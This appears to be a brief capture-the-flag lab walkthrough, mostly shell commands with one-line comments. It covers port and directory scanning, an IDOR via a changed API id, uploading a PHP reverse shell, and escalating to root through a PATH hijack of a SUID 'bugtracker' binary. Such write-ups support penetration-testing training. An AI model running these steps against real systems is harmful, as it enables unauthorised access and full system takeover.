# Task 1 solved.

# Searching for open ports.
sudo nmap -sV -sC [ip]

# Mapping the site with Burpsuite.
# Task 2 solved.

# Task 3 solved.

# Decreasing API call by 1
# content=accounts&id=1
# Task 4 solved.

gobuster dir -u http://[ip] -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Task 5 solved.

# We upload the file php-reverse-shell.php to grant bash access.

# Stabilize bash.
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CRTL + Z
stty raw -echo;fg
export TERM-xterm

# We do lateral movement.

# Task 6 solved.

# Task 7 solved.

ssh [user]@[ip]

# Use the password that we found

id

find / -group bugtracker 2>/dev/null

ls -lah /usr/bin/bugtracker

# Task 8 solved.

# Task 9 solved.

strings /usr/bin/bugtracker

# We found that it is using [Task 10] instead of /bin/[Task 10]

# Task 10 solved.

# Task 11 solved.

# Flag 1 owned.

cd /tmp
echo -e '#!/bin/bash\n/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH



/usr/bin/bugtracker somefile
root
python3 -c 'import pty; pty.spawn("/bin/bash")'

cd /root
less root.txt

# Flag 2 owned.
